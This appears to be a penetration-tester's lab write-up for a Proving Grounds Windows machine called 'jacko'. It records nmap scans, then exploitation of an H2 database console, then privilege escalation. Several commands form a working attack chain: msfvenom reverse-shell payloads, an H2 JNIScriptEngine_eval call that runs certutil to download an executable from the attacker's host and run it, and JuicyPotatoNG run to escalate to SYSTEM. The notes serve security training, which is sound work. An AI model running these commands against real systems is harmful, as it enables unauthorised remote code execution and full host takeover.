# nmap
```
┌──(kali㉿kali)-[~/PG/jacko]
└─$ nmap -p- --min-rate 10000 192.168.152.66 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 00:37 EST
Warning: 192.168.152.66 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.152.66
Host is up (0.039s latency).
Not shown: 65500 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
1127/tcp  filtered supfiledbg
5040/tcp  open     unknown
5813/tcp  filtered icmpd
7680/tcp  open     pando-pub
8082/tcp  open     blackice-alerts
9092/tcp  open     XmlIpcRegSvc
12371/tcp filtered unknown
13032/tcp filtered unknown
14654/tcp filtered unknown
17610/tcp filtered unknown
17842/tcp filtered unknown
18367/tcp filtered unknown
18771/tcp filtered unknown
21669/tcp filtered unknown
25885/tcp filtered unknown
35904/tcp filtered unknown
49586/tcp filtered unknown
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49669/tcp open     unknown
50967/tcp filtered unknown
50970/tcp filtered unknown
55115/tcp filtered unknown
57117/tcp filtered unknown
57229/tcp filtered unknown
57413/tcp filtered unknown
59000/tcp filtered unknown
64481/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 14.53 seconds
                                                                                                                                           
┌──(kali㉿kali)-[~/PG/jacko]
└─$ nmap -p 80,135,139,445,1127,5040,5813,7680,8082,9092 -sCV 192.168.152.66
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 00:38 EST
Nmap scan report for 192.168.152.66
Host is up (0.039s latency).

PORT     STATE  SERVICE       VERSION
80/tcp   open   http          Microsoft IIS httpd 10.0
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds?
1127/tcp closed supfiledbg
5040/tcp open   unknown
5813/tcp closed icmpd
7680/tcp open   pando-pub?
8082/tcp open   http          H2 database http console
|_http-title: H2 Console
9092/tcp open   XmlIpcRegSvc?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.95%I=7%D=2/23%Time=67BAB447%P=x86_64-pc-linux-gnu%r(NU
SF:LL,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\
SF:0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i
SF:\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0
SF:l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\
SF:0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\
SF:.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n
SF:\0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0
SF:R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x
SF:20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\
SF:x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0
SF:o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\
SF:x009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0
SF:a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0
SF:S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n
SF:\0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g
SF:\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o
SF:\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D
SF:\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\
SF:r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.
SF:\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p
SF:\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\
SF:x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b")%r(informi
SF:x,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0
SF:t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\
SF:0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l
SF:\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0
SF:h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.
SF:\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\
SF:0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R
SF:\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x2
SF:0\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x
SF:20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o
SF:\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x
SF:009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a
SF:\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S
SF:\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\
SF:0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\
SF:0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\
SF:0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\
SF:0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r
SF:\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\
SF:0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\
SF:0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x
SF:20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-23T05:40:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.45 seconds
```

![Pasted image 20250223134347](<0. Attachments/Pasted image 20250223134347.png>)
![Pasted image 20250223134427](<0. Attachments/Pasted image 20250223134427.png>)

# web enum

![Pasted image 20250223135437](<0. Attachments/Pasted image 20250223135437.png>)

![Pasted image 20250223135518](<0. Attachments/Pasted image 20250223135518.png>)

after connecting
![Pasted image 20250223135646](<0. Attachments/Pasted image 20250223135646.png>)

# exploit
https://www.exploit-db.com/exploits/49384
![Pasted image 20250223135835](<0. Attachments/Pasted image 20250223135835.png>)

after running all the commands
![Pasted image 20250223140052](<0. Attachments/Pasted image 20250223140052.png>)
# initial access
creating a rev shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.203 LPORT=4444 -f exe -o rev.exe
```

![Pasted image 20250223141537](<0. Attachments/Pasted image 20250223141537.png>)
```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -split -urlcache -f http://192.168.45.203/rev.exe C:\\Users\\tony\\rev.exe").getInputStream()).useDelimiter("\\Z").next()');
```

![Pasted image 20250223141656](<0. Attachments/Pasted image 20250223141656.png>)
```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\rev.exe").getInputStream()).useDelimiter("\\Z").next()');
```

![Pasted image 20250223141921](<0. Attachments/Pasted image 20250223141921.png>)

![Pasted image 20250223142052](<0. Attachments/Pasted image 20250223142052.png>)

# local.txt
![Pasted image 20250223142722](<0. Attachments/Pasted image 20250223142722.png>)
# priv esc enum

![Pasted image 20250223142138](<0. Attachments/Pasted image 20250223142138.png>)

[Releases · BeichenDream/GodPotato · GitHub](https://github.com/BeichenDream/GodPotato/releases) - didnt work

[Release JuicyPotatoNG v1.1 · antonioCoco/JuicyPotatoNG · GitHub](https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1)

testing above
![Pasted image 20250223144746](<0. Attachments/Pasted image 20250223144746.png>)

# priv esc and proof.txt
creating a new shell to use
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.203 LPORT=443 -f exe -o rev1.exe
```

transfer it
and use the new exploit as
```
.\JuicyPotatoNG.exe -t * -p rev1.exe
```

![Pasted image 20250223145256](<0. Attachments/Pasted image 20250223145256.png>)

![Pasted image 20250223145312](<0. Attachments/Pasted image 20250223145312.png>)

